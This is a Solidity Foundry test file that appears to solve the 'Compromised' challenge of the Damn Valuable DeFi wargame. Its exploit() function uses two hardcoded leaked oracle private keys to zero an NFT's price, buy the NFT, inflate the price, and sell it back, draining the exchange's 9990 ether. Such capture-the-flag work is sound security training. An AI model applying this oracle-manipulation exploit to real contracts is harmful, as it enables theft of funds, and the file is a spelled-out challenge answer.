// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.10;

import "../BaseTest.sol";
import "../../compromised/Exchange.sol";
import "../../compromised/TrustfulOracle.sol";
import "../../compromised/TrustfulOracleInitializer.sol";
import "../../DamnValuableNFT.sol";

contract Compromised is BaseTest {
    uint256 EXCHANGE_INITIAL_BALANCE = 9990 ether;
    uint256 INITIAL_NFT_PRICE = 999 ether;

    Exchange exchange;
    TrustfulOracle trustfulOracle;
    TrustfulOracleInitializer trustfulOracleInitializer;
    DamnValuableNFT damnValuableNFT;

    address attacker;
    address[] sources = new address[](3);

    constructor() {
        string[] memory labels = new string[](1);
        labels[0] = "Attacker";
        preSetup(1, labels); // 100 ether to the attacker
    }

    function setUp() public override {
        super.setUp();
        attacker = users[0];
        //
        // Set sources and set a balance
        sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
        sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
        sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;
        for (uint i; i < 3; i++) {
            payable(sources[i]).transfer(2 ether);
            assertEq(sources[i].balance, 2 ether);
        }
        //
        // Deploy the TrusfulOracleInitializeFactory
        string[] memory symbols = new string[](3);
        symbols[0] = "DVNFT";
        symbols[1] = "DVNFT";
        symbols[2] = "DVNFT";
        uint256[] memory initialPrices = new uint256[](3);
        initialPrices[0] = INITIAL_NFT_PRICE;
        initialPrices[1] = INITIAL_NFT_PRICE;
        initialPrices[2] = INITIAL_NFT_PRICE;
        trustfulOracleInitializer = new TrustfulOracleInitializer(sources, symbols, initialPrices);
        trustfulOracle = trustfulOracleInitializer.oracle();
        //
        // Deploy the exchange
        exchange = new Exchange{value: EXCHANGE_INITIAL_BALANCE}(address(trustfulOracle));
        assertEq(address(exchange).balance, EXCHANGE_INITIAL_BALANCE);
        damnValuableNFT = exchange.token();
    }

    function test_Exploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */
        //
        // Set priv keys from the leaked data
        address signer1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
        address signer2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
        //
        // Change prices to zero
        vm.prank(signer1);
        trustfulOracle.postPrice("DVNFT", 0);
        vm.prank(signer2);
        trustfulOracle.postPrice("DVNFT", 0);
        //
        // Buy the NFT at zero price
        vm.prank(attacker);
        exchange.buyOne{value: 0.1 ether}();
        //
        // Change the NFT price to the max value
        vm.prank(signer1);
        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_BALANCE);
        vm.prank(signer2);
        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_BALANCE);
        //
        // Sell the overprice NFT
        vm.startPrank(attacker);
        damnValuableNFT.approve(address(exchange), 0);
        exchange.sellOne(0);
        vm.stopPrank();
        //
        // Change back the NFT price
        vm.prank(signer1);
        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.prank(signer2);
        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */
        //
        // The exchange balance is zero
        assertEq(address(exchange).balance, 0);
        //
        // Attacker balance is more than initial balance (100 ether)
        assertEq(address(attacker).balance, 100 ether + EXCHANGE_INITIAL_BALANCE);
        //
        // Attacker does not have any NFT
        assertEq(damnValuableNFT.balanceOf(address(attacker)), 0);
        //
        // NFT price should not have changed
        assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}